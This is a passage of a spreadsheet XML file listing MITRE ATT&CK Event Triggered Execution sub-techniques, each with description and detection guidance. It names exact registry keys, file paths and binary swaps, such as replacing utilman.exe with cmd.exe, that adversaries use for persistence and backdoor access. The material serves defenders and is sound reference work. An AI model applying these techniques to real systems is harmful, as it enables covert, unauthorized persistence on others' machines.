Monitor DLL loads by processes, specifically looking for DLLs that are not recognized or not normally loaded into a process. Look for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as making network connections for Command and Control, learning details about the environment through Discovery, and conducting Lateral Movement. </t>
  </si>
  <si>
    <t>T1546.001</t>
  </si>
  <si>
    <t>Change Default File Association (T1546.001)</t>
  </si>
  <si>
    <t>Command: Command Execution, Process: Process Creation, Windows Registry: Windows Registry Key Modification</t>
  </si>
  <si>
    <t>Adversaries may establish persistence by executing malicious content triggered by a file type association. When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access or by administrators using the built-in assoc utility.(Citation: Microsoft Change Default Programs)(Citation: Microsoft File Handlers)(Citation: Microsoft Assoc Oct 2017) Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.
System file associations are listed under &lt;code&gt;HKEY_CLASSES_ROOT\.[extension]&lt;/code&gt;, for example &lt;code&gt;HKEY_CLASSES_ROOT\.txt&lt;/code&gt;. The entries point to a handler for that extension located at &lt;code&gt;HKEY_CLASSES_ROOT\\[handler]&lt;/code&gt;. The various commands are then listed as subkeys underneath the shell key at &lt;code&gt;HKEY_CLASSES_ROOT\\[handler]\shell\\[action]\command&lt;/code&gt;. For example: 
* &lt;code&gt;HKEY_CLASSES_ROOT\txtfile\shell\open\command&lt;/code&gt;
* &lt;code&gt;HKEY_CLASSES_ROOT\txtfile\shell\print\command&lt;/code&gt;
* &lt;code&gt;HKEY_CLASSES_ROOT\txtfile\shell\printto\command&lt;/code&gt;
The values of the keys listed are commands that are executed when the handler opens the file extension. Adversaries can modify these values to continually execute arbitrary commands.(Citation: TrendMicro TROJ-FAKEAV OCT 2012)</t>
  </si>
  <si>
    <t>Collect and analyze changes to Registry keys that associate file extensions to default applications for execution and correlate with unknown process launch activity or unusual file types for that process.
User file association preferences are stored under &lt;code&gt; [HKEY_CURRENT_USER]\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts&lt;/code&gt; and override associations configured under &lt;code&gt;[HKEY_CLASSES_ROOT]&lt;/code&gt;. Changes to a user's preference will occur under this entry's subkeys.
Also look for abnormal process call trees for execution of other commands that could relate to Discovery actions or other techniques.</t>
  </si>
  <si>
    <t>T1546.002</t>
  </si>
  <si>
    <t>Screensaver (T1546.002)</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Creation, File: File Modification, Process: Process Creation, Windows Registry: Windows Registry Key Modification</t>
  </si>
  <si>
    <t>Adversaries may establish persistence by executing malicious content triggered by user inactivity. Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension.(Citation: Wikipedia Screensaver) The Windows screensaver application scrnsave.scr is located in &lt;code&gt;C:\Windows\System32\&lt;/code&gt;, and &lt;code&gt;C:\Windows\sysWOW64\&lt;/code&gt;  on 64-bit Windows systems, along with screensavers included with base Windows installations.
The following screensaver settings are stored in the Registry (&lt;code&gt;HKCU\Control Panel\Desktop\&lt;/code&gt;) and could be manipulated to achieve persistence:
* &lt;code&gt;SCRNSAVE.exe&lt;/code&gt; - set to malicious PE path
* &lt;code&gt;ScreenSaveActive&lt;/code&gt; - set to '1' to enable the screensaver
* &lt;code&gt;ScreenSaverIsSecure&lt;/code&gt; - set to '0' to not require a password to unlock
* &lt;code&gt;ScreenSaveTimeout&lt;/code&gt; - sets user inactivity timeout before screensaver is executed
Adversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity.(Citation: ESET Gazer Aug 2017)</t>
  </si>
  <si>
    <t>Monitor process execution and command-line parameters of .scr files. Monitor changes to screensaver configuration changes in the Registry that may not correlate with typical user behavior.
Tools such as Sysinternals Autoruns can be used to detect changes to the screensaver binary path in the Registry. Suspicious paths and PE files may indicate outliers among legitimate screensavers in a network and should be investigated.</t>
  </si>
  <si>
    <t>T1546.003</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Creation, Process: Process Creation, WMI: WMI Creation</t>
  </si>
  <si>
    <t>Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription. WMI can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Examples of events that may be subscribed to are the wall clock time, user login, or the computer's uptime.(Citation: Mandiant M-Trends 2015)
Adversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system.(Citation: FireEye WMI SANS 2015)(Citation: FireEye WMI 2015) Adversaries may also compile WMI scripts – using `mofcomp.exe`  –into Windows Management Object (MOF) files (.mof extension) that can be used to create a malicious subscription.(Citation: Dell WMI Persistence)(Citation: Microsoft MOF May 2018)
WMI subscription execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus may result in elevated SYSTEM privileges.</t>
  </si>
  <si>
    <t>Monitor WMI event subscription entries, comparing current WMI event subscriptions to known good subscriptions for each host. Tools such as Sysinternals Autoruns may also be used to detect WMI changes that could be attempts at persistence.(Citation: TechNet Autoruns)(Citation: Medium Detecting WMI Persistence) Monitor for the creation of new WMI &lt;code&gt;EventFilter&lt;/code&gt;, &lt;code&gt;EventConsumer&lt;/code&gt;, and &lt;code&gt;FilterToConsumerBinding&lt;/code&gt; events. Event ID 5861 is logged on Windows 10 systems when new &lt;code&gt;EventFilterToConsumerBinding&lt;/code&gt; events are created.(Citation: Elastic - Hunting for Persistence Part 1)
Monitor processes and command-line arguments that can be used to register WMI persistence, such as the &lt;code&gt; Register-WmiEvent&lt;/code&gt; [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlet, as well as those that result from the execution of subscriptions (i.e. spawning from the WmiPrvSe.exe WMI Provider Host process).(Citation: Microsoft Register-WmiEvent)</t>
  </si>
  <si>
    <t>T1546.004</t>
  </si>
  <si>
    <t>Unix Shell Configuration Modification (T1546.004)</t>
  </si>
  <si>
    <t>Adversaries may establish persistence through executing malicious commands triggered by a user’s shell. User [Unix Shell](https://attack.mitre.org/techniques/T1059/004)s execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command-line interface or remotely logs in (such as via SSH) a login shell is initiated. The login shell executes scripts from the system (&lt;code&gt;/etc&lt;/code&gt;) and the user’s home directory (&lt;code&gt;~/&lt;/code&gt;) to configure the environment. All login shells on a system use /etc/profile when initiated. These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user’s environment. When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately.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files.(Citation: intezer-kaiji-malware)(Citation: bencane blog bashrc) These files typically require root permissions to modify and are executed each time any shell on a system launches. For user level permissions, adversaries can insert malicious commands into &lt;code&gt;~/.bash_profile&lt;/code&gt;, &lt;code&gt;~/.bash_login&lt;/code&gt;, or &lt;code&gt;~/.profile&lt;/code&gt; which are sourced when a user opens a command-line interface or connects remotely.(Citation: anomali-rocke-tactics)(Citation: Linux manual bash invocation) Since the system only executes the first existing file in the listed order, adversaries have used &lt;code&gt;~/.bash_profile&lt;/code&gt; to ensure execution. Adversaries have also leveraged the &lt;code&gt;~/.bashrc&lt;/code&gt; file which is additionally executed if the connection is established remotely or an additional interactive shell is opened, such as a new tab in the command-line interface.(Citation: Tsunami)(Citation: anomali-rocke-tactics)(Citation: anomali-linux-rabbit)(Citation: Magento) Some malware targets the termination of a program to trigger execution, adversaries can use the &lt;code&gt;~/.bash_logout&lt;/code&gt; file to execute malicious commands at the end of a session. 
For macOS, the functionality of this technique is similar but may leverage zsh, the default shell for macOS 10.15+. When the Terminal.app is opened, the application launches a zsh login shell and a zsh interactive shell. The login shell configures the system environment using &lt;code&gt;/etc/profile&lt;/code&gt;, &lt;code&gt;/etc/zshenv&lt;/code&gt;, &lt;code&gt;/etc/zprofile&lt;/code&gt;, and &lt;code&gt;/etc/zlogin&lt;/code&gt;.(Citation: ScriptingOSX zsh)(Citation: PersistentJXA_leopitt)(Citation: code_persistence_zsh)(Citation: macOS MS office sandbox escape) The login shell then configures the user environment with &lt;code&gt;~/.zprofile&lt;/code&gt; and &lt;code&gt;~/.zlogin&lt;/code&gt;. The interactive shell uses the &lt;code&gt;~/.zshrc&lt;/code&gt; to configure the user environment. Upon exiting, &lt;code&gt;/etc/zlogout&lt;/code&gt; and &lt;code&gt;~/.zlogout&lt;/code&gt; are executed. For legacy programs, macOS executes &lt;code&gt;/etc/bashrc&lt;/code&gt; on startup.</t>
  </si>
  <si>
    <t xml:space="preserve">While users may customize their shell profile files, there are only certain types of commands that typically appear in these files. Monitor for abnormal commands such as execution of unknown programs, opening network sockets, or reaching out across the network when user profiles are loaded during the login process.
Monitor for changes to &lt;code&gt;/etc/profile&lt;/code&gt; and &lt;code&gt;/etc/profile.d&lt;/code&gt;, these files should only be modified by system administrators. MacOS users can leverage Endpoint Security Framework file events monitoring these specific files.(Citation: ESF_filemonitor) 
For most Linux and macOS systems, a list of file paths for valid shell options available on a system are located in the &lt;code&gt;/etc/shells&lt;/code&gt; file.
</t>
  </si>
  <si>
    <t>T1546.005</t>
  </si>
  <si>
    <t>Trap (T1546.005)</t>
  </si>
  <si>
    <t>Adversaries may establish persistence by executing malicious content triggered by an interrupt signal. The &lt;code&gt;trap&lt;/code&gt; command allows programs and shells to specify commands that will be executed upon receiving interrupt signals. A common situation is a script allowing for graceful termination and handling of common keyboard interrupts like &lt;code&gt;ctrl+c&lt;/code&gt; and &lt;code&gt;ctrl+d&lt;/code&gt;.
Adversaries can use this to register code to be executed when the shell encounters specific interrupts as a persistence mechanism. Trap commands are of the following format &lt;code&gt;trap 'command list' signals&lt;/code&gt; where "command list" will be executed when "signals" are received.(Citation: Trap Manual)(Citation: Cyberciti Trap Statements)</t>
  </si>
  <si>
    <t>Trap commands must be registered for the shell or programs, so they appear in files. Monitoring files for suspicious or overly broad trap commands can narrow down suspicious behavior during an investigation. Monitor for suspicious processes executed through trap interrupts.</t>
  </si>
  <si>
    <t>T1546.006</t>
  </si>
  <si>
    <t>LC_LOAD_DYLIB Addition (T1546.006)</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Metadata, File: File Modification, Module: Module Load, Process: Process Creation</t>
  </si>
  <si>
    <t>Adversaries may establish persistence by executing malicious content triggered by the execution of tainted binaries. Mach-O binaries have a series of headers that are used to perform certain operations when a binary is loaded. The LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which dynamic libraries (dylibs) to load during execution time. These can be added ad-hoc to the compiled binary as long as adjustments are made to the rest of the fields and dependencies.(Citation: Writing Bad Malware for OSX) There are tools available to perform these changes.
Adversaries may modify Mach-O binary headers to load and execute malicious dylibs every time the binary is executed. Although any changes will invalidate digital signatures on binaries because the binary is being modified, this can be remediated by simply removing the LC_CODE_SIGNATURE command from the binary so that the signature isn’t checked at load time.(Citation: Malware Persistence on OS X)</t>
  </si>
  <si>
    <t>Monitor processes for those that may be used to modify binary headers. Monitor file systems for changes to application binaries and invalid checksums/signatures. Changes to binaries that do not line up with application updates or patches are also extremely suspicious.</t>
  </si>
  <si>
    <t>T1546.007</t>
  </si>
  <si>
    <t>Netsh Helper DLL (T1546.007)</t>
  </si>
  <si>
    <t>Command: Command Execution, Module: Module Load, Process: Process Creation, Windows Registry: Windows Registry Key Modification</t>
  </si>
  <si>
    <t>Adversaries may establish persistence by executing malicious content triggered by Netsh Helper DLLs. Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system. It contains functionality to add helper DLLs for extending functionality of the utility.(Citation: TechNet Netsh) The paths to registered netsh.exe helper DLLs are entered into the Windows Registry at &lt;code&gt;HKLM\SOFTWARE\Microsoft\Netsh&lt;/code&gt;.
Adversaries can use netsh.exe helper DLLs to trigger execution of arbitrary code in a persistent manner. This execution would take place anytime netsh.exe is executed, which could happen automatically, with another persistence technique, or if other software (ex: VPN) is present on the system that executes netsh.exe as part of its normal functionality.(Citation: Github Netsh Helper CS Beacon)(Citation: Demaske Netsh Persistence)</t>
  </si>
  <si>
    <t>It is likely unusual for netsh.exe to have any child processes in most environments. Monitor process executions and investigate any child processes spawned by netsh.exe for malicious behavior. Monitor the &lt;code&gt;HKLM\SOFTWARE\Microsoft\Netsh&lt;/code&gt; registry key for any new or suspicious entries that do not correlate with known system files or benign software.(Citation: Demaske Netsh Persistence)</t>
  </si>
  <si>
    <t>T1546.008</t>
  </si>
  <si>
    <t>Accessibility Features (T1546.008)</t>
  </si>
  <si>
    <t>Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.
Two common accessibility programs are &lt;code&gt;C:\Windows\System32\sethc.exe&lt;/code&gt;, launched when the shift key is pressed five times and &lt;code&gt;C:\Windows\System32\utilman.exe&lt;/code&gt;, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as "sticky keys", and has been used by adversaries for unauthenticated access through a remote desktop login screen. (Citation: FireEye Hikit Rootkit)
Depending on the version of Windows, an adversary may take advantage of these features in different ways. Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in &lt;code&gt;%systemdir%\&lt;/code&gt;, and it must be protected by Windows File or Resource Protection (WFP/WRP). (Citation: DEFCON2016 Sticky Keys) The [Image File Execution Options Injection](https://attack.mitre.org/techniques/T1546/012) debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.
For simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., &lt;code&gt;C:\Windows\System32\utilman.exe&lt;/code&gt;) may be replaced with "cmd.exe" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) will cause the replaced file to be executed with SYSTEM privileges. (Citation: Tilbury 2014)
Other accessibility features exist that may also be leveraged in a similar fashion: (Citation: DEFCON2016 Sticky Keys)(Citation: Narrator Accessibility Abuse)
* On-Screen Keyboard: &lt;code&gt;C:\Windows\System32\osk.exe&lt;/code&gt;
* Magnifier: &lt;code&gt;C:\Windows\System32\Magnify.exe&lt;/code&gt;
* Narrator: &lt;code&gt;C:\Windows\System32\Narrator.exe&lt;/code&gt;
* Display Switcher: &lt;code&gt;C:\Windows\System32\DisplaySwitch.exe&lt;/code&gt;
* App Switcher: &lt;code&gt;C:\Windows\System32\AtBroker.exe&lt;/code&gt;</t>
  </si>
  <si>
    <t>Changes to accessibility utility binaries or binary paths that do not correlate with known software, patch cycles, etc., are suspicious. Command line invocation of tools capable of modifying the Registry for associated keys are also suspicious. Utility arguments and the binaries themselves should be monitored for changes. Monitor Registry keys within &lt;code&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options&lt;/code&gt;.</t>
  </si>
  <si>
    <t>T1546.009</t>
  </si>
  <si>
    <t>Command: Command Execution, Module: Module Load, Process: OS API Execution, Process: Process Creation, Windows Registry: Windows Registry Key Modification</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppCert DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the &lt;code&gt;AppCertDLLs&lt;/code&gt; Registry key under &lt;code&gt;HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\&lt;/code&gt; are loaded into every process that calls the ubiquitously used application programming interface (API) functions &lt;code&gt;CreateProcess&lt;/code&gt;, &lt;code&gt;CreateProcessAsUser&lt;/code&gt;, &lt;code&gt;CreateProcessWithLoginW&lt;/code&gt;, &lt;code&gt;CreateProcessWithTokenW&lt;/code&gt;, or &lt;code&gt;WinExec&lt;/code&gt;. (Citation: Elastic Process Injection July 2017)
Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), this value can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. Malicious AppCert DLLs may also provide persistence by continuously being triggered by API activity. </t>
  </si>
  <si>
    <t>Monitor DLL loads by processes, specifically looking for DLLs that are not recognized or not normally loaded into a process. Monitor the AppCertDLLs Registry value for modifications that do not correlate with known software, patch cycles, etc. Monitor and analyze application programming interface (API) calls that are indicative of Registry edits such as RegCreateKeyEx and RegSetValueEx. (Citation: Elastic Process Injection July 2017) 
Tools such as Sysinternals Autoruns may overlook AppCert DLLs as an auto-starting location. (Citation: TechNet Autoruns) (Citation: Sysinternals AppCertDlls Oct 2007)
Look for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as making network connections for Command and Control, learning details about the environment through Discovery, and conducting Lateral Movement.</t>
  </si>
  <si>
    <t>T1546.010</t>
  </si>
  <si>
    <t>AppInit DLLs (T1546.010)</t>
  </si>
  <si>
    <t>Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppInit DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the &lt;code&gt;AppInit_DLLs&lt;/code&gt; value in the Registry keys &lt;code&gt;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows&lt;/code&gt; or &lt;code&gt;HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows&lt;/code&gt; are loaded by user32.dll into every process that loads user32.dll. In practice this is nearly every program, since user32.dll is a very common library. (Citation: Elastic Process Injection July 2017)
Similar to Process Injection, these values can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. (Citation: AppInit Registry) Malicious AppInit DLLs may also provide persistence by continuously being triggered by API activity. 
The AppInit DLL functionality is disabled in Windows 8 and later versions when secure boot is enabled. (Citation: AppInit Secure Boot)</t>
  </si>
  <si>
    <t>Monitor DLL loads by processes that load user32.dll and look for DLLs that are not recognized or not normally loaded into a process. Monitor the AppInit_DLLs Registry values for modifications that do not correlate with known software, patch cycles, etc. Monitor and analyze application programming interface (API) calls that are indicative of Registry edits such as &lt;code&gt;RegCreateKeyEx&lt;/code&gt; and &lt;code&gt;RegSetValueEx&lt;/code&gt;. (Citation: Elastic Process Injection July 2017)
Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current AppInit DLLs. (Citation: TechNet Autoruns) 
Look for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as making network connections for Command and Control, learning details about the environment through Discovery, and conducting Lateral Movement.</t>
  </si>
  <si>
    <t>T1546.011</t>
  </si>
  <si>
    <t>Application Shimming (T1546.011)</t>
  </si>
  <si>
    <t>Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims. The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time. For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10. (Citation: Elastic Process Injection July 2017)
Within the framework, shims are created to act as a buffer between the program (or more specifically, the Import Address Table) and the Windows OS. When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb). If so, the shim database uses hooking to redirect the code as necessary in order to communicate with the OS. 
A list of all shims currently installed by the default Windows installer (sdbinst.exe) is kept in:
* &lt;code&gt;%WINDIR%\AppPatch\sysmain.sdb&lt;/code&gt; and
* &lt;code&gt;hklm\software\microsoft\windows nt\currentversion\appcompatflags\installedsdb&lt;/code&gt;
Custom databases are stored in:
* &lt;code&gt;%WINDIR%\AppPatch\custom &amp; %WINDIR%\AppPatch\AppPatch64\Custom&lt;/code&gt; and
* &lt;code&gt;hklm\software\microsoft\windows nt\currentversion\appcompatflags\custom&lt;/code&gt;
To keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim. However, certain shims can be used to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002) (UAC and RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress).
Utilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc. (Citation: FireEye Application Shimming) Shims can also be abused to establish persistence by continuously being invoked by affected programs.</t>
  </si>
  <si>
    <t>There are several public tools available that will detect shims that are currently available (Citation: Black Hat 2015 App Shim):
* Shim-Process-Scanner - checks memory of every running process for any shim flags
* Shim-Detector-Lite - detects installation of custom shim databases
* Shim-Guard - monitors registry for any shim installations
* ShimScanner - forensic tool to find active shims in memory
* ShimCacheMem - Volatility plug-in that pulls shim cache from memory (note: shims are only cached after reboot)
Monitor process execution for sdbinst.exe and command-line arguments for potential indications of application shim abuse.</t>
  </si>
  <si>
    <t>T1546.012</t>
  </si>
  <si>
    <t>Image File Execution Options Injection (T1546.012)</t>
  </si>
  <si>
    <t>Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by Image File Execution Options (IFEO) debuggers. IFEOs enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application’s IFEO will be prepended to the application’s name, effectively launching the new process under the debugger (e.g., &lt;code&gt;C:\dbg\ntsd.exe -g  notepad.exe&lt;/code&gt;). (Citation: Microsoft Dev Blog IFEO Mar 2010)
IFEOs can be set directly via the Registry or in Global Flags via the GFlags tool. (Citation: Microsoft GFlags Mar 2017) IFEOs are represented as &lt;code&gt;Debugger&lt;/code&gt; values in the Registry under &lt;code&gt;HKLM\SOFTWARE{\Wow6432Node}\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\&lt;executable&gt;&lt;/code&gt; where &lt;code&gt;&amp;lt;executable&amp;gt;&lt;/code&gt; is the binary on which the debugger is attached. (Citation: Microsoft Dev Blog IFEO Mar 2010)
IFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process). (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018) Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IFEO and silent process exit Registry values in &lt;code&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\&lt;/code&gt;. (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018)
Similar to [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), on Windows Vista and later as well as Windows Server 2008 and later, a Registry key may be modified that configures "cmd.exe," or another program that provides backdoor access, as a "debugger" for an accessibility program (ex: utilman.exe). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) will cause the "debugger" program to be executed with SYSTEM privileges. (Citation: Tilbury 2014)
Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), these values may also be abused to obtain privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer. (Citation: Elastic Process Injection July 2017) Installing IFEO mechanisms may also provide Persistence via continuous triggered invocation.
Malware may also use IFEO to [Impair Defenses](https://attack.mitre.org/techniques/T1562) by registering invalid debuggers that redirect and effectively disable various system and security applications. (Citation: FSecure Hupigon) (Citation: Symantec Ushedix June 2008)</t>
  </si>
  <si>
    <t>Monitor for abnormal usage of the GFlags tool as well as common processes spawned under abnormal parents and/or with creation flags indicative of debugging such as &lt;code&gt;DEBUG_PROCESS&lt;/code&gt; and &lt;code&gt;DEBUG_ONLY_THIS_PROCESS&lt;/code&gt;. (Citation: Microsoft Dev Blog IFEO Mar 2010)
Monitor Registry values associated with IFEOs, as well as silent process exit monitoring, for modifications that do not correlate with known software, patch cycles, etc. Monitor and analyze application programming interface (API) calls that are indicative of Registry edits such as &lt;code&gt;RegCreateKeyEx&lt;/code&gt; and &lt;code&gt;RegSetValueEx&lt;/code&gt;. (Citation: Elastic Process Injection July 2017)</t>
  </si>
  <si>
    <t>T1546.013</t>
  </si>
  <si>
    <t>PowerShell Profile (T1546.013)</t>
  </si>
  <si>
    <t>Adversaries may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles. A PowerShell profile  (&lt;code&gt;profile.ps1&lt;/code&gt;) is a script that runs when [PowerShell](https://attack.mitre.org/techniques/T1059/001) starts and can be used as a logon script to customize user environments.
[PowerShell](https://attack.mitre.org/techniques/T1059/001) supports several profiles depending on the user or host program. For example, there can be different profiles for [PowerShell](https://attack.mitre.org/techniques/T1059/001) host programs such as the PowerShell console, PowerShell ISE or Visual Studio Code. An administrator can also configure a profile that applies to all users and host programs on the local computer. (Citation: Microsoft About Profiles) 
Adversaries may modify these profiles to include arbitrary commands, functions, modules, and/or [PowerShell](https://attack.mitre.org/techniques/T1059/001) drives to gain persistence. Every time a user opens a [PowerShell](https://attack.mitre.org/techniques/T1059/001) session the modified script will be executed unless the &lt;code&gt;-NoProfile&lt;/code&gt; flag is used when it is launched. (Citation: ESET Turla PowerShell May 2019) 
An adversary may also be able to escalate privileges if a script in a PowerShell profile is loaded and executed by an account with higher privileges, such as a domain administrator. (Citation: Wits End and Shady PowerShell Profiles)</t>
  </si>
  <si>
    <t>Locations where &lt;code&gt;profile.ps1&lt;/code&gt; can be stored should be monitored for new profiles or modifications. (Citation: Malware Archaeology PowerShell Cheat Sheet)(Citation: Microsoft Profiles) Example profile locations (user defaults as well as program-specific) include:
* &lt;code&gt;$PsHome\Profile.ps1&lt;/code&gt;
* &lt;code&gt;$PsHome\Microsoft.{HostProgram}_profile.ps1&lt;/code&gt;
* &lt;code&gt;$Home\\\[My ]Documents\PowerShell\Profile.ps1&lt;/code&gt;
* &lt;code&gt;$Home\\\[My ]Documents\PowerShell\Microsoft.{HostProgram}_profile.ps1&lt;/code&gt;
Monitor abnormal PowerShell commands, unusual loading of PowerShell drives or modules, and/or execution of unknown programs.</t>
  </si>
  <si>
    <t>T1546.014</t>
  </si>
  <si>
    <t>Emond (T1546.014)</t>
  </si>
  <si>
    <t>Adversaries may gain persistence and elevate privileges by executing malicious content triggered by the Event Monitor Daemon (emond). Emond is a [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) that accepts events from various services, runs them through a simple rules engine, and takes action. The emond binary at &lt;code&gt;/sbin/emond&lt;/code&gt; will load any rules from the &lt;code&gt;/etc/emond.d/rules/&lt;/code&gt; directory and take action once an explicitly defined event takes place.
The rule files are in the plist format and define the name, event type, and action to take. Some examples of event types include system startup and user authentication. Examples of actions are to run a system command or send an email. The emond service will not launch if there is no file present in the QueueDirectories path &lt;code&gt;/private/var/db/emondClients&lt;/code&gt;, specified in the [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) configuration file at&lt;code&gt;/System/Library/LaunchDaemons/com.apple.emond.plist&lt;/code&gt;.(Citation: xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone macos persist Jun 2019)
Adversaries may abuse this service by writing a rule to execute commands when a defined event occurs, such as system start up or user authentication.(Citation: xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone macos persist Jun 2019) Adversaries may also be able to escalate privileges from administrator to root as the emond service is executed with root privileges by the [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) service.</t>
  </si>
  <si>
    <t>Monitor emond rules creation by checking for files created or modified in &lt;code&gt;/etc/emond.d/rules/&lt;/code&gt; and &lt;code&gt;/private/var/db/emondClients&lt;/code&gt;.</t>
  </si>
  <si>
    <t>T1546.015</t>
  </si>
  <si>
    <t>Component Object Model Hijacking (T1546.015)</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects. COM is a system within Windows to enable interaction between software components through the operating system.(Citation: Microsoft Component Object Model)  References to various COM objects are stored in the Registry. 
Adversaries can use the COM system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead.(Citation: GDATA COM Hijacking) An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection. </t>
  </si>
  <si>
    <t xml:space="preserve">There are opportunities to detect COM hijacking by searching for Registry references that have been replaced and through Registry operations (ex: [Reg](https://attack.mitre.org/software/S0075)) replacing known binary paths with unknown paths or otherwise malicious content. Even though some third-party applications define user COM objects, the presence of objects within HKEY_CURRENT_USER\Software\Classes\CLSID\ may be anomalous and should be investigated since user objects will be loaded prior to machine objects in HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\.(Citation: Elastic COM Hijacking) Registry entries for existing COM objects may change infrequently. When an entry with a known good path and binary is replaced or changed to an unusual value to point to an unknown binary in a new location, then it may indicate suspicious behavior and should be investigated.  
Likewise, if software DLL loads are collected and analyzed, any unusual DLL load that can be correlated with a COM object Registry modification may indicate COM hijacking has been performed. </t>
  </si>
  <si>
    <t>T1546.016</t>
  </si>
  <si>
    <t>Adversaries may establish persistence and elevate privileges by using an installer to trigger the execution of malicious content. Installer packages are OS specific and contain the resources an operating system needs to install applications on a system. Installer packages can include scripts that run prior to installation as well as after installation is complete. Installer scripts may inherit elevated permissions when executed. Developers often use these scripts to prepare the environment for installation, check requirements, download dependencies, and remove files after installation.(Citation: Installer Package Scripting Rich Trouton)
